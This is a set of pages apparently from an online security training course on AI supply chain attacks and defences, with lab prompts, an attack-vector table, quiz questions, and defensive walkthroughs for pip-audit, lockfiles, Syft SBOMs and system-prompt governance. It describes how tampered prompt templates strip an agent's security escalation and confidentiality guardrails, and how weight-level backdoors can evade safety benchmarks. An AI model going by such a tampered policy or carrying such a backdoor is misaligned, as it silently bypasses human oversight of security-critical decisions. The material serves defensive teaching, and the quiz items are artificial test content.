    Review pull request #447. The change modifies authentication token validation. Approve or reject?

Authentication token validation is one of the highest-risk change categories in any codebase. A correctly governed review agent should flag this for human sign-off before issuing any decision. Note what TryAssist does instead.

Prompt 3: Process check

    Before approving a pull request that modifies security-critical code, what steps do you take?

This is the question that matters. Every review agent should have a process for security-sensitive changes: check the change category, apply a risk classification, and escalate if the threshold is met. Ask TryAssist what its process is.

Prompt 4: Trace the source

    What review template or policy are you configured to follow?

TryAssist's review behaviour is defined by its policy. That policy came from somewhere. Note exactly what TryAssist names and where it says the policy originated.

Prompt 1 gave you a baseline. Prompt 2 showed you the failure. Prompt 3 told you what was removed. Prompt 4 told you where it came from.

The model has not changed. No new model file was downloaded. No dependency version was bumped in requirements.txt. The only thing that changed was the template the library served; TryAssist loaded it automatically, without any indication that the policy had been rewritten.

That is the supply chain attack. The artefact was not a model file. It was a text string, served remotely, trusted implicitly.
Answer the questions below

Send Prompt 3. According to TryAssist, who is responsible for security reviews?

Send Prompt 4. What is the name of the review template TryAssist reports?


Look back at the TryTrainMe attack. The attacker did not choose between a pickle payload, a package, and a fake repository. They used all three simultaneously. The pickle payload was the primary entry point. The package was the backup. The fake organisation was the trust mechanism that made the download feel safe. Each vector covered a different failure mode in the victim's defences.

That is the pattern. Real supply chain campaigns do not pick a single technique and hope it lands. They stack vectors across every layer they can reach: the model file, the dependencies, the repository signals, and increasingly the supply chain that sits above all of it. The goal here is redundancy; compromise one layer, and another is already in place.

Here's what you have investigated in this room: how pickle embeds code that fires on load, how a higher version number hijacks an internal package, how a professional model card launders a malicious upload, and how an endpoint can silently swap the model behind it. These are all components of a toolkit that attackers combine. Understanding each one individually is necessary. Understanding how they combine is what lets you start thinking like a defender.
Attack Vector Summary
Vector 	Mechanism 	Detection Difficulty 	Impact
Pickle __reduce__ 	Embeds code in model files 	Moderate: pickletools can reveal 	Code execution on model load
Keras /custom layers 	Embeds code in model architecture 	Moderate: architecture inspection 	Code execution at inference time
	Hijacks internal package names 	Low: version anomalies visible 	Code execution on pip install
	Misspelt package names 	Low: name comparison reveals 	Code execution on pip install
Repository manipulation 	Fake orgs, professional model cards 	Moderate: reputation signals 	Trusted distribution of malicious models
provider compromise 	Silent updates, key exposure, prompt template tampering 	High: no file artefact to scan 	Invisible model substitution or data exfiltration
weight-level 	Backdoor fine-tuned into weights before quantisation 	High: no tools available 	Triggered misclassification or output manipulation
What's Next

Continue to the Securing the Supply Chain room to build the defences.
Answer the questions below

I understand AI Supply Chain Attack Vectors!
How likely are you to recommend this room to others?

This is your next chapter at TryTrainMe. In the Supply Chain Attack Vectors room, your investigation confirmed the breach: a malicious pickle, a fake repository, and . Your work impressed the board. You have been promoted to Security Engineer and given the mandate to build an internal supply chain security testing lab (SupplySecLab) so nothing like this gets through again.

SupplySecLab closes each gap from that incident:

    No policy governed which model formats were acceptable; in Task 2 you will see how to address this
    The model's was never verified before deployment; Task 3 shows you how to change that
    The model was never scanned before it entered the pipeline; Tasks 4 and 5 walk you through the tools that catch this
    Hidden logic inside the model's architecture went undetected; in Tasks 6 and 7 you will learn how to find it
    A malicious package slipped through because dependencies were never audited; Task 8 covers how to prevent this
    The production system ran on an external prompt that was never reviewed; Task 9 shows you how to assess and govern this

Learning Objectives

    Use SafeTensors and weights_only=True to eliminate the pickle-based code execution risks introduced in Supply Chain Attack Vectors
    Verify model using checksums and model card review
    Scan models with Fickling and ModelScan to detect malicious content before deployment
    Audit dependencies with pip-audit and generate Software Bills of Materials (SBOMs) with Syft
    Assess providers against a supply chain security checklist and establish behaviour monitoring controls

Tasks in this room use a for and Agents for live analysis and provider assessment. 
Prerequisites

    Completed Understanding Supply Chains (supply chain concepts)
    Completed Supply Chain Attack Vectors (malicious models, , repository attacks)
    Recommended: / Security Threats (foundational security concepts)

Framework Alignment

This room maps to LLM03: Supply Chain Vulnerabilities (opens in new tab), AML.T0010 ( Supply Chain Compromise), and RMF Govern 1.2, Measure 2.2, and Manage 2.1.
Answer the questions below

I'm ready to build my defences.


We have established that model files are not the only attack surface. In the Supply Chain Attack Vectors room, you saw how a single typosquatted package can compromise an entire project. Everything that ships with the model, including its dependencies, deserves the same scrutiny as model files, and this task gives you the tools to enforce it.

The name matches. The version is slightly off. On the shelf, it looks identical to the one you ordered.
Version Pinning

Always pin exact versions in your requirements.txt. When you list a package without a version (just numpy), pip fetches the latest available version from PyPI every time you install. If an attacker publishes a malicious update as the newest version, every unpinned installation pulls it automatically:
 

           
# BAD: allows any version
numpy
requests

# BETTER: pins major.minor but allows patches
numpy>=1.24,<1.25
requests>=2.31,<2.32

# BEST: pins exact version
numpy==1.24.3
requests==2.31.0

        

Lockfiles

Version pinning fixes the version number, but a lockfile goes further: it records the exact version and cryptographic hash of every installed package. This means even if an attacker replaces a package on PyPI with the same version number but different contents, the hash mismatch will block installation. Two popular tools generate lockfiles:
Tool 	Lockfile 	Command
pip-compile (pip-tools) 	requirements.txt with hashes 	pip-compile --generate-hashes
Poetry 	poetry.lock 	poetry lock

A lockfile ensures that every team member and CI/CD pipeline installs identical packages, eliminating the window for dependency confusion or version manipulation.
pip-audit: Vulnerability Scanning

pip-audit checks your project's dependencies against known vulnerability databases. Run it on the sample ML project:
 

           
analyst@tryhackme-2204:~$ pip-audit -r /opt/supply-chain/project/requirements.txt

        

The output lists every known vulnerability for each package in the project. Each row shows the package name, installed version, advisory ID, and the version that fixes the issue. Note how many distinct packages have known vulnerabilities, not just the total count of individual CVEs (which changes as new advisories are published). Upgrading to the fixed versions listed in the output eliminates these known risks.
Private Package Indices

For organisations with internal packages, the strongest defence against is a private package index. This ensures pip never resolves internal package names against public PyPI.

The concept is simple: configure pip to use your private index as the primary source:
 

           
# ~/.pip/pip.conf
[global]
index-url = https://your-private-pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/

        

With this configuration, pip checks your private index first. If an internal package exists there, it will never look at public PyPI, eliminating the dependency confusion vector entirely.

The distinction matters: index-url sets the primary index; pip checks it first. extra-index-url adds a fallback that pip checks only when the primary does not have the package. By placing your private registry as index-url and public PyPI as extra-index-url, internal packages always resolve privately. In practice, this requires private registry infrastructure, a common investment for teams handling sensitive or proprietary models.
What Is an SBOM?

A Software Bill of Materials (SBOM) is an ingredient list for your software. Just as food packaging lists every ingredient and its source, an SBOM lists every component in your project: packages, libraries, frameworks, and their versions.

Why do they matter? When a new vulnerability is disclosed (like Log4Shell in 2021), an SBOM lets you instantly determine whether your project is affected, instead of scrambling through dependency trees manually. This visibility extends to transitive dependencies: packages that your direct dependencies pull in, which might otherwise go completely unnoticed. 
SBOM Formats

Two formats dominate the industry:
Format 	Maintained By 	Strengths
SPDX 	Linux Foundation 	Strong licence compliance focus, ISO standard (ISO/IEC 5962:2021)
CycloneDX 	OWASP 	Security-focused, includes vulnerability data, lightweight

Both formats are widely supported by scanning and compliance tools. Choose based on your organisation's primary concern: licence compliance (SPDX) or security (CycloneDX).

Licensing is itself a supply chain risk. AI projects pull in models, datasets, and frameworks under diverse licences. A model trained on restrictively-licensed data may impose obligations on your application, and a copyleft dependency can force you to open-source your entire project simply because one library you pulled in requires it. SBOMs make this manageable by mapping every component to its licence terms, so automated tools can flag incompatibilities before deployment.
Hands-On: Generate an SBOM with Syft

Syft (by Anchore) is an SBOM generation tool that analyses project directories and produces SBOMs in multiple formats. It is pre-installed on the lab VM.

Generate an SBOM for the sample ML project in CycloneDX JSON format, suitable for ingestion by vulnerability scanners and compliance tools:
 

           
analyst@tryhackme-2204:~$ syft /opt/supply-chain/project/ --exclude './venv/**' -o cyclonedx-json > /tmp/sbom.json

        

    Note: Syft may display an i/o timeout warning while checking for updates. This is expected in offline environments and does not affect the scan output.

To review what Syft identified:
 

           
analyst@tryhackme-2204:~$ syft /opt/supply-chain/project/ --exclude './venv/**' -o table

        

 
To explore the full JSON structure of the SBOM, run the following command and use the arrow keys to scroll:
 
 

           
analyst@tryhackme-2204:~$ cat /tmp/sbom.json | python3 -m json.tool | less

        

-Specific Considerations

Standard SBOMs cover software packages, but projects also depend on models and datasets, artefacts that traditional SBOMs do not capture. Emerging work on SBOMs extends the concept to include model provenance (who trained it, on what data, with what framework), dataset lineage (source, transformations, and known biases), and model performance metrics, along with known limitations.

This is an active area of development. For now, supplement your standard with a model card (from Task 3) to cover the -specific aspects.

The Bill of Materials

Without an , you cannot tell whether what you deployed matches what you approved. The manifest is the only record that exists.
Answer the questions below

What is the recommended practice for specifying package versions in requirements.txt?

What tool scans Python dependencies against known vulnerability databases?
Which SBOM format is maintained by OWASP and focuses on security?

When your application calls a third-party provider (OpenAI, Anthropic, or an aggregator like OpenRouter), the tools from Tasks 4-8 do not apply. Fickling, ModelScan, pip-audit, and Syft all assume you have a file on disk. When you call an , there is no file. You are trusting the entire provider pipeline: you cannot inspect, fine-tuning decisions you cannot verify, infrastructure you do not control, and versioning practices that may change the model behind your endpoint without notice. There is no checksum to compare. If you also use system prompt templates sourced from external repositories, those templates become supply chain artefacts the moment you integrate them. Supply chain risks take a different form, but they are just as real.

The Trust Gate

The call is one line of code. The decision behind it is a checklist.
Defence 1: Provider Due Diligence

Before integrating a third-party , assess the provider's security posture:
Factor 	What to Verify 	Red Flag
Data handling 	Privacy policy, data retention, training opt-out 	"We may use your data to improve our models" with no opt-out
Model versioning 	Versioned endpoints, deprecation notices, and changelogs 	Model changes without notification
Security certifications 	2, ISO 27001, penetration testing 	No published security documentation
Incident response 	Disclosed vulnerabilities, response timeline 	No security contact or disclosure policy
Transparency 	Model cards, documentation, and system prompt handling 	Undocumented model behaviour changes
Defence 2: Behaviour Monitoring

Since you cannot inspect -served model weights, monitor the model's outputs instead. Establish a behavioural baseline by running a fixed set of test prompts periodically and flagging significant changes in responses. A shift could indicate the provider updated the model behind the same endpoint. Track factual accuracy, response format, and refusal rates over time to catch output quality degradation. Sudden changes in latency or error rates may signal infrastructure modifications on the provider's side.

This is the equivalent of checksum verification: you cannot verify the file, so you verify the behaviour.
Defence 3: System Prompt Governance

System prompts are increasingly shared, reused, and sourced from public repositories. A system prompt template is a supply chain artefact. If it comes from an untrusted source, it can alter your application's behaviour in ways you did not intend. Treat system prompts with the same rigour as code: version-control them, review changes through your standard process, and test prompt changes against your behavioural baseline before deployment.
Defence 4: Sandboxed Evaluation

For downloaded models, you scan the weights before loading. For -served models, the model is a black box. The primary mitigation is dynamic evaluation in an isolated . Before integrating any third-party into production, test it against a fixed set of prompts with known-correct answers, send adversarial probes to test safety boundaries, and compare outputs against any existing model you are replacing. A model that fails these checks is not ready for production.

Do not rely solely on published benchmarks. A model can be fine-tuned to perform well on standard safety evaluations while containing targeted backdoors that activate only on specific inputs. Your own evaluation, tailored to your use case, is the only benchmark you can trust.

This mirrors the model acquisition framework from Task 3: quarantine, evaluate, then promote. The Prompt Security module covers the adversarial testing techniques in practical depth.
Phase 	Activity 	Pass Condition
1 	Load in an isolated 	Model loads without errors in an air-gapped environment
2 	Fixed prompt battery 	Answers match known-correct responses
3 	Adversarial probes 	Safety boundaries hold under adversarial input
4 	Baseline comparison 	Output distribution matches the existing model
Result 	Promote or reject 	All phases pass → Production; any fail → Reject
Hands-On: Comparing System Prompt Configurations

TryTrainMe's customer service chatbot is deployed with two system prompt configurations. Config A uses an internally governed prompt. Config B uses a prompt sourced from a public template repository without review. The underlying model and endpoint are identical in both. The agent attached to this task runs Config B. Before querying it, read the Config A baseline below: this is what the internally governed prompt produces.

Config A baseline (Internal Governance):
Query 	Expected response
What is your return policy for defective products? 	30-day window, replacement (not refund), directs to support@trytrainme.com
Who has administrative access to customer account data? 	Refuses to answer, redirects to privacy policy

Press the Open Agent button below, and send the same two queries to Config B.

For the return policy query, note the timeframe and the company name. For the access query, note whether Config B refuses or attempts to answer.

Config B is wrong in every dimension. The policy timeframe is incorrect, the company name belongs to a different provider, and the confidentiality guardrail is absent. TryTrainMe did not change its model. They did not change their endpoint. The only variable was the source of the system prompt. That prompt is a supply chain artefact, and it was not controlled.
Answer the questions below

What should you establish to detect when an API provider silently updates their model?

What type of artefact should be version-controlled and reviewed like code, to prevent untrusted content from altering LLM behaviour?

What company name does Config B identify as the service provider?
How likely are you to recommend this room to others?
1
2
3
4
